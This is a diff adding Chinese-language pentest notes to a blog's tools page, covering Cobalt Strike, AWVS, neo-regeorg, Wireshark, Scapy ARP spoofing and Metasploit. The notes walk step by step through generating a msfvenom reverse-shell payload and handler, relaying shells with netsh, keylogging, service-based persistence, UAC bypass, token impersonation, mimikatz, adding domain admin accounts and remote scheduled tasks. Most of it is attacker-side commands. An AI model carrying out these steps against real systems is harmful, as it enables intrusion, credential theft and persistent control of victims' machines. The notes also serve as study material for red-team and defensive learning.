@@ -20,6 +20,331 @@ cover: /img/tools.png
 
 # tools 
 
+## CS(Cobalt-Strike)
+
+下载CS包后使用teamserver来运行
+
+> teamserver IP（自己的） 密码
+>
+> 来启动一个服务
+>
+> 
+>
+> 然后使用cobaltstrike来监听服务
+>
+> 用户名随便，端口默认即可（50050）密码是刚刚自己设置的密码用户名也是自己刚刚设置的用户名
+
+Cobalt Stricke->listener->add添加监听器
+
+![image-20220218105927379](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-1.png)
+
+注意这个Hosts是需要添加攻击者的ip
+
+![image-20220218110141048](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-2.png)
+
+创建完成后显示如上方的可以看出监听了80端口
+
+![image-20220218110809529](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-3.png)
+
+单机launch以后出现如下框
+
+![image-20220218110849052](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-4.png)
+
+把脚本内容复制到一个文件中(Windows能运行的格式),之后单机ok,在Event Log选项框中就会显示监听记录,然后用Windows来执行这个文件就可以上线了
+
+![image-20220218111623239](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-5.png)
+
+然后就可以看出来上线了
+
+右击该电脑后选择interact后如下框内可以输入命令（默认60秒回显一次，如果想要设置时间右击被控制的电脑选择session->sleep）,**使用help可以查看所有的命令**
+
+![image-20220218111744041](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-6.png)
+
+
+
+- 菜单栏
+
+  - CobaltStrack
+
+    - VPN Interfaces：设置VPN
+    - Listeners：创建监听端口
+    - Visuallzation：查看结果
+    - Script Manager：加载一个脚本
+
+  - View
+
+    - application：显示被控制电脑的信息
+
+    - credentials：可以获取密码
+
+    - Downloads：从被控的电脑下载东西
+
+    - EventLog：上线记录
+
+    - Keystrokes：键盘记录
+
+    - ProxyPivots：代理模块
+
+      - ![image-20220218121457035](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-7.png)
+
+    - screenshots：截图
+
+    - scriptconsole：执行脚本
+
+      - sleep语言
+
+        - e用于定义变量例如:e $a="haha";
+
+        - x变量输出例如:x $a;
+
+          - x targets():输出目标ip地址啥的
+          - x listeners():输出监听器
+          - x beacons():所有感染的主机信息
+          - x downloads():显示下载信息
+          - x sites():显示资产信息
+          - x screenshots()显示屏幕信息
+          - x credentials():显示凭据信息
+
+        - $代表变量
+
+        - @代表数组例如:@arr=@('a','b');
+
+        - load 用来加载本地的sleep文件并执行
+
+        - println输出
+
+        - foreach循环例如:foreach $var (@arr){println($var);}
+
+        - %定义字典例如:%dic['aaa']="asdas";%dic[$aaa]="asdas";
+
+        - **.** 字符串的衔接符号例如"aaa"."bbbb"
+
+        - reload重新加载(这个时候是只能从已经加载的文件中重新加载使用ls来查看已经加载的文件)
+
+        - command w {e $var=1;println("you are click w".$var);}调用的时候直接w即可,**并且用help可以看到这条命令**
+
+        - sub定义函数sub fun1{println("111");}fun1();
+
+          - ![image-20220218141618775](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-14.png)
+
+        - bind绑定键盘快捷键例如bind Ctrl+o{show_message("aaa");elog("bbb");}
+
+        - popup自定义菜单例如:
+
+          - ![image-20220218143029938](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-15.png)
+
+          - ```sleep
+            popup item1{
+              item("&kkk",{url_open("http://www.baidu.com")});
+              separator();
+              item("&vvv",{url_open("http://www.cctv.com")});
+            }
+            menubar("my popup","item1");
+            
+            //右击添加菜单
+            popup item1{
+            	menu "attack"{
+            	 item("&kkk",{url_open("http://www.baidu.com")});
+              	separator();
+              	item("&vvv",{url_open("http://www.cctv.com")});
+              }
+            }
+            ```
+
+    - target
+
+    - weblog：web日志
+
+  - attacks：
+
+    - package：攻击方式
+      - HTML application基于HTML攻击应用的载荷
+      - MS office macro宏病毒
+      - Payload Generator：生成payload
+      - Windows Executable：生成exe后门对方运行即可上线
+      - Windows Executable（s）：提供代理设置，内网攻击可能用到
+    - Web Drive-by：
+      - manage：肉鸡管理
+      - clone site：克隆网站
+      - Host file：指定文件夹到web里
+      - Script web delivery：web攻击模块
+      - signed applet attack：Java钓鱼
+      - smark applet attack
+      - system profile：客户端检测工具
+    - spear Phish：钓鱼邮件
+
+  - Reporting：生成报告栏
+
+- 右击肉鸡
+
+  - intetact:输入指令
+    - 如果目标在域上面可以使用net computer查看计算机
+    - net dclist查找域控
+    - net domain_trusts域的信任情况
+    - net logons
+    - net share共享
+    - 
+  - access:
+    - make Token:创建一个虚拟用户
+  - exploit:
+    - Browser Pivot:监听浏览器以获取cookie
+    - Desktop:监控桌面
+    - File Browser:
+      - ![image-20220218123725120](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-11.png)
+    - port scan:扫描端口
+    - process list:查看所有进程
+    - screenshot:截屏幕
+  - pivoting
+    - socks server:使肉鸡创建代理
+    - listeners:使肉鸡开启监听
+  - session
+    - sleep:命令反应时间
+    - exit:关闭肉鸡
+    - remove:移除肉鸡
+
+
+
+### 用肉鸡来创建代理并连接到metasploit
+
+![image-20220218121633689](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-8.png)
+
+
+
+
+
+### 跳板攻击
+
+![image-20220218121934998](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-9.png)
+
+单击save就可以看见Listeners多了一个监听端口
+
+![image-20220218122224254](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-10.png)
+
+然后让其他内网直接连接这个ip:port即可 
+
+
+
+### 监听浏览器输入
+
+将进程添加到键盘记录
+
+![image-20220218133049983](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-12.png)
+
+
+
+
+
+打开全局的键盘监听
+
+![image-20220218133152326](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-13.png)
+
+然后就可以监听键盘记录了
+
+
+
+### 提供下载木马地址并进行下载
+
+首先生成一个木马
+
+![image-20220218163434235](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-16.png)
+
+设置监听的文件第二个图的file里选择木马，url里面的文件名称要和你的木马名称一致
+
+![image-20220218163509654](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-17.png)
+
+![image-20220218163554181](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-18.png)
+
+
+
+launch后他给出下载文件的地址,复制即可下载运行即可上线
+
+![image-20220218163757545](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-19.png)
+
+
+
+### 维持化
+
+首先生成一个木马
+
+选择一个目录
+
+upload [木马所在位置]这也就可以上传了
+
+shell sc create "服务名称" -binpath="脚本全称(包含路径)"
+
+shell sc description "服务名称" "服务的描述"
+
+shell sc config "服务名称" start=auto
+
+shell net start "服务名称"
+
+
+
+### 多层次的连接
+
+方法一:
+
+首先给添加一个tcp监听
+
+![image-20220218171804604](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-20.png)
+
+然后创建一个payload使用刚刚建立的tcp监听
+
+![image-20220218171859961](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-21.png)
+
+然后上传到目标的内网服务器中并运行
+
+然后使用肉鸡的命令行输入connect [目标的ip地址]
+
+![image-20220218172009462](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-22.png)
+
+方法二:
+
+![image-20220218172823811](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-23.png)
+
+首先使用肉鸡建立一个监听
+
+生成payload 使用这个监听
+
+然后让目标主机运行即可
+
+
+
+特征过滤：https://kosakd.top/2021/05/05/CobaltStrike%E6%95%99%E7%A8%8B/
+
+
+
+## AWVS
+
+AWVS是一款知名的自动化网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞。它可以扫描任何可通过Web浏览器访问的和遵循HTTP/HTTPS规则的Web站点和Web应用程序。适用于任何中小型和大型企业的内联网、外延网和面向客户、雇员、厂商和其它人员的Web网站。WVS可以通过检查SQL注入攻击漏洞、XSS跨站脚本攻击漏洞等漏洞来审核Web应用程序的安全性。
+
+
+
+>pull 拉取下载镜像
+>docker pull secfa/docker-awvs
+>
+>或者
+>
+>docker pull secfa/awvs
+>
+>
+>
+>将Docker的3443端口映射到物理机的 13443端口
+>docker run -it -d -p 13443:3443 secfa/docker-awvs
+>
+>容器的相关信息
+>awvs13 username: admin@admin.com
+>awvs13 password: Admin123
+>AWVS版本：13.0.200217097
+>
+>浏览器访问：https://127.0.0.1:13443/ 即可
+>
+>注意了是HTTPS而不是HTTP
+
+https://www.bilibili.com/video/BV1fz4y1U7tt?from=search&seid=3146379149281441812&spm_id_from=333.337.0.0
+
+这上面最后一部分讲到了代码如何使用
+
 ## nmap
 
 nmap：一款端口扫描工具
@@ -229,6 +554,78 @@ nc -nv [ip] [端口] -e cmd.exe
 
 >- -l:将nc监听模式运行
 >- -k:接受一个请求不会结束而是继续监听
+
+
+
+## neo-regeorg
+
+生成一个有密码的脚本
+
+python neoreg.py generate -k 密码
+
+然后生成几个脚本，将脚本放到目标网站并且能访问到
+
+python neoreg.py -k 密码 -u 网站的脚本位置
+
+然后他会返回一个socket5的连接方法,将他设置为代理即可访问
+
+## WireShark
+
+![image-20220214133549383](D:\Code\pojo\Blog\BlogHexo\public\img\wireshark.png)
+
+ （1）Frame:  物理层的数据帧概况
+
+ （2）Ethernet II: 数据链路层以太网帧头部信息
+
+ （3）Internet Protocol Version 4: 互联网层IP包头部信息
+
+ （4）Transmission Control Protocol: 传输层T的数据段头部信息，此处是TCP
+
+ （5）Hypertext Transfer Protocol: 应用层的信息，此处是HTTP协议
+
+
+
+过滤规则
+
+ip==127.0.0.1
+
+> ip.dst==127.0.0.1目的ip查询
+>
+> ip.src==127.0.0.1源ip查询
+
+
+
+协议过滤
+
+直接写协议即可如tcp,icmp,udp,http等
+
+>对协议内的内容进行过滤如:
+>
+>http.request.method=="POST"
+>
+>tcp.port=443
+
+
+
+连接符
+
+and/or/not
+
+
+
+tcp三次握手
+
+第一次发送数据包SYN=1,ACK=0
+
+第二次接收数据包SYN=1,ACK=1
+
+第三次发送数据包SYN=0,ACK=1
+
+
+
+## Nessus
+
+http://www.luckyzmj.cn/posts/477c90d0.html
 
 
 
@@ -588,6 +985,8 @@ nsummary和summary的区别
 
 #### 套接字
 
+套接字简单的理解是网络中两个应用之间的通信格式是ip：端口
+
 默认情况使用本地套接字，如果要使用手动的数据包捕获库函数就要安装下面的东西：
 
 - 在UNIX/OSX上：确保安装了libpcap。
@@ -672,3 +1071,399 @@ AsyncSniffer使用这个来代替sniff就可以了参数和sniff一样
 
 
 
+#### ARP欺骗
+
+ARP：地址解析协议用来通知网络我是谁
+
+原理是让受害机认为我是网关，让网关认为我是受害机
+
+
+
+关于scapy的ARP包
+
+![image-20220307165322717](D:\Code\pojo\Blog\BlogHexo\public\img\scapy-14.png)
+
+>op 为1代表请求,为2代表响应
+>
+>hwsrc 发送方的MAC地址
+>
+>psrc    发送方的ip
+>
+>hwdst 目标的MAC
+>
+>pdst    目标的IP
+
+
+
+
+
+## rdesktop
+
+远程桌面连接软件
+
+https://blog.csdn.net/cunjiu9486/article/details/109073104
+
+
+
+## metasploit
+
+### **常用的功能模块**
+
+模块在kali的位置
+
+> /usr/share/metasploit-framework/scripts/meterpreter
+
+| 模块名称  | 模块作用                                                     |
+| --------- | ------------------------------------------------------------ |
+| Auxiliary | 负责执行信息收集，扫描，嗅探，指纹识别，口令猜测和Dos攻击等功能的辅助模块 |
+| Exploits  | 利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动，被动） |
+| Payloads  | 成功exploit之后，真正在目标系统执行的代码和命令。            |
+| Post      | 后期渗透模块，在取得目标系统远程控制权后吗，进行一系列的后渗透攻击动作，如获取敏感信息，跳板攻击等操作。 |
+| Encoders  | 对payload进行加密，躲避antiviru检查的模块。                  |
+| Nops      | 提高payload稳定性及维持大小，在渗透攻击构造恶意数据缓冲区时，常常要在真正要执行shellcode之前添加一段空指令区，这样当触发渗透攻击后跳转执行shellcode时，有一个较大的安全着陆区，从而避免受到内存地址随机化，返回地址计算偏差等原因造成的shellcode执行失败，提高渗透攻击的可靠性。 |
+
+
+
+升级msf
+
+>apt update
+
+MSFDB
+
+>msfdb init       # start and initialize the database  postgresql
+>msfdb reinit    # delete and reinitialize the database
+>msfdb delete  # delete database and stop using it
+>msfdb start     # start the database
+>msfdb stop     # stop the database
+>msfdb status   # check service status
+>msfdb run       # start the database and run msfconsole
+
+
+
+| help或者？   | 显示msfconsole可以使用的命令。                               |
+| ------------ | ------------------------------------------------------------ |
+| connect      | 可以理解为MSF中的nc命令，可以使用connect -h查看详细用法。    |
+| show         | 可以查看msf提供的资源。在根目录下执行的话，由于有些资源模块比较多，需要执行show命令较长的时间。show exploits：查看可以使用的exploit。除了exploits，还支持all，encoders，nops，payloads，auxiliary，post，options。有些选项需要用use使用一个模块后才能使用，show targets。 |
+| search       | 搜索模块简单搜索：search ms17_010。多条件搜素缩小范围：search name:mysql type:exploit platform:linux |
+| info         | 查看模块信息info <module name>如果用use使用了一个模块，直接输入info查看。 |
+| use          | search找到模块后，用use使用模块use exploit/windows/smb/mso8_067_netapi用use使用一个模块后，可以使用show options查看我们需要配置的选项，使用show targets选择目标主机系统，使用show payload选择payload。 |
+| set/setg     | 设置参数，比如要渗透的主机ip，payload等 ，我们可以使用show missing查看没有设置的参数。setg是设置全局变量，避免每个模块都要输入相同参数 |
+| unset/unsetg | 取消设置参数和取消设置的全局变量                             |
+| save         | 设置的此参数在下一次启动的时候不会生效，可以用save保存我们使用过程的设置。 |
+| check        | 检查模块是否真的存在这个漏洞，大部分模块没有check功能        |
+
+| back        | 返回msfcomsole根目录                                         |
+| ----------- | ------------------------------------------------------------ |
+| run/exploit | 开始使用模块exploit -j：以后台进行运行                       |
+| sessions    | 查看当前以建立的sessions，说明已经拿到了shellsessions -i id 可以进入一个session交互 |
+| load/unload | 调用外部的扫描命令，比如openvas                              |
+| loadpath    | 加载自己的模块                                               |
+| route       | 添加一条路由，比如发往某个子网的流量都通过攻陷的机器发送。   |
+
+
+
+获取到的肉鸡下面运行的命令如下:
+
+- run
+
+  - get_local_subnets:搜集内网信息
+  - autoroute -s 内网ip/子网掩码长度:将肉鸡添加路由内网的功能
+    - -p 查看路由表情况
+  - post/windows/gather/arp_scanner RHOSTS=内网ip/子网掩码长度    ==是RHOSTS不是RHOST==:扫描内网
+
+- portfwd flush:应该是清除设置
+
+  - portfwd add -L 黑客ip -l 黑客的端口 -p 内网的某些来向端口 -r 内网的某台计算机的ip
+
+    - >portfwd add -L 192.168.43.185 -l 2020 -p 80 -r 172.10.10.1
+      >
+      >这句话的意思是将172.10.10.1:80的数据转发到192.168.43.185:2020
+      >
+      >访问192.168.43.185:2020就直接跳转到172.10.10.1:80上面了
+
+    - **这条命令可以当作给肉鸡添加路由表**
+
+    
+
+socket代理:承接上面的当我们设置了内网服务器为跳板的时候（metasploit已经进入内网了，需要将他设置为跳板让别的软件也能访问内网）
+
+- use auxiliary/server/socks_proxy：使用代理模块
+
+- set srvhost 127.0.0.1：设置本机代理
+
+- set srvport 40004：设置本机端口
+
+- set version 4a：设置代理版本
+
+- run：启用代理
+
+- jobs：查看启动是否成功
+
+- vim /etc/proxychains4.conf修改代理文件
+
+- [ProxyList]下面添加socks4 127.0.0.1 40004(IP 和端口号改成自己的),并且proxy_dns注释掉
+
+- 接下来就可以使用了
+
+- proxychains 命令
+
+  - >例如
+    >
+    >proxychains nmap "http://www.baidu.com"
+
+netsh进行msf的代理
+
+假设当前网络为这样
+
+![image-20220219163859692](D:\Code\pojo\Blog\BlogHexo\public\img\内网-1.png)
+
+黑客(kali)                                                           Windows    1                                             Windows 2
+
+
+
+生成一个木马脚本
+
+> msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.214.140 lport=4455 -f exe > aaa.exe
+>
+> msfconsole
+>
+> use exploit/multi/handler
+>
+> set payload windows/meterpreter/reverse_tcp
+>
+> set lhost 192.168.1.186
+>
+> set lport 4455
+>
+> exploit
+>
+> 获取之后可以使用background返回上一层
+
+
+
+然后在Windows1上面设置
+
+>netsh interface portproxy add v4tov4 listenport=4455 connectaddress=192.168.1.186 connectport=4455
+
+设置完成后Windows2上面如果运行了攻击脚本则会获取shell
+
+
+
+### uac提权
+
+控制了肉鸡以后
+
+> use exploit/windows/local/bypassuac
+>
+> set session 1(设置成被控制的那个肉鸡)
+>
+> run
+>
+> 之后要求用户机那边输入用户名和密码
+
+和上面那个一样
+
+> use exploit/windows/local/ask
+>
+> set session 1
+>
+> run
+
+### 令牌窃取
+
+>以下的命令是进入控制肉鸡之后输入的
+>
+>![image-20220220140740957](D:\Code\pojo\Blog\BlogHexo\public\img\令牌-2.png)
+>
+>也就是上面图片的那个模式
+
+use incognito
+
+list_tokens -u(能看到的令牌数量因权限决定)
+
+然后会显示类似如下的信息
+![image-20220220140421802](D:\Code\pojo\Blog\BlogHexo\public\img\令牌-1.png)
+
+上面的Delegation Tokens是可以登录的下面的是不可以登录的
+
+
+
+假冒令牌:
+
+impersonate_token (上面的可登录的用户如:TEST1\\\\user1)
+
+
+
+**题外话**
+
+load mimikatz
+
+kerberos_ticket_list列出登录信息?
+
+kerberos_ticket_use
+
+
+
+ps查看进程
+
+如果有管理员没退出,残留了一些进程我们尝试进入那个进程从而获取他的权限
+
+操作方法如下:
+
+migrate PID
+
+> 当拿到域控管理员的时候我们可以添加一个用户
+>
+> add_user 用户名 密码 -h 域控服务器的ip地址
+
+> 添加用户到组从而提权
+>
+> add_group_user "domain admins" 用户名 -h 域控制器的ip地址
+
+==**下面的命令是Windows中使用的**==
+
+当我们添加完毕之后如果域控的服务器开启着c盘的共享
+
+我们使用
+
+> net use \\\\域控的ip\\c$ "密码" /user:用户名
+
+然后就可以访问到目标的c盘了,如果对方开启了135,445端口可是使用如下的命令
+
+> net use \\\\域控的ip\\ipc$ "密码" /user:用户名
+
+远程访问进程
+
+>tasklist /S ip /U 用户名 /P 密码
+
+设置计划任务
+
+>at \\\\ip 时间(例如:9:51PM) cmd.exe "执行命令"
+>
+>schtasks /create /s IP地址 /tn test1 /sc onstart /tr c:/a.bat /ru system /f       (这条命令的意思是运行c下的a.bat)
+
+
+
+### 后渗透
+
+#### 权限提升
+
+1.UAC需要用户身份认证的
+
+2.使用绕过uac提权
+
+3.寻找操作系统是否有本地溢出的漏洞
+
+
+
+第一种方法
+
+> use exploit/windows/local/ask
+>
+> set filename QQ.exe #设置文件名
+>
+> set sessions #查看获取用户的session号
+>
+> set session 7
+>
+> exploit #当用户点击确定之后便成功
+>
+> sessions -i 7
+>
+> getsystem
+
+
+
+第二种方法
+
+UAC绕过
+
+>use exploit/windows/local/bypassuac
+>
+>set sessions
+>
+>set session 9
+>
+>sessions -i 9
+>
+>exploit
+>
+>getuid      #查看提权是否成功不成功的话使用getsystem尝试
+
+
+
+第三种方法
+
+查询Windows提权漏洞
+
+例如ms16_016
+
+
+
+#### 信息搜集
+
+进入session之后
+
+> run post/windows/gather/checkvm #检查是否是虚拟机
+>
+> 
+>
+> run post/windows/gather/forensics/enum_drives #获取驱动器
+>
+> 
+>
+> run post/windows/gather/enum_services #查看运行的服务
+>
+> 
+>
+> run post/windows/gather/enum_applications #列出安装的应用
+>
+> 
+>
+> run post/windows/gather/enum_share #查看是否存在共享
+>
+> 
+>
+> run post/windows/gather/dumplinks #搜集内网的其他信息
+>
+> 
+>
+> run post/windows/gather/enum_patches #查看存在的补丁
+>
+> 
+>
+> run scraper #自动获取信息(脚本)
+>
+> run winenum #获取Windows操作系统的信息(脚本)
+
+
+
+**数据包获取**
+
+![image-20220227134412878](D:\Code\pojo\Blog\BlogHexo\public\img\sniffer.png)
+
+>load sniffer #加载sniffer
+>
+>help #查看获取的命令
+>
+>
+>
+>由于抓取的包会存在内存中而不是放入硬盘所以一般一次只能抓取5万个包,所以要经常来下载包
+>
+>使用sniffer_dump来获取信息      sniffer_dump 文件名
+>
+>然后使用wireshark来数据包的分析或者使用auxiliary/sniffer/psnuffle
+>
+>
+>
+>使用auxiliary/sniffer/psnuffle方式来解析
+>
+>use auxiliary/sniffer/psnuffle
+>
+>set pcapfile 文件位置
+>
+>
+>
+>或者使用packetrecorder 来获取数据包
+>
+>在session里 run packetrecorder [参数]
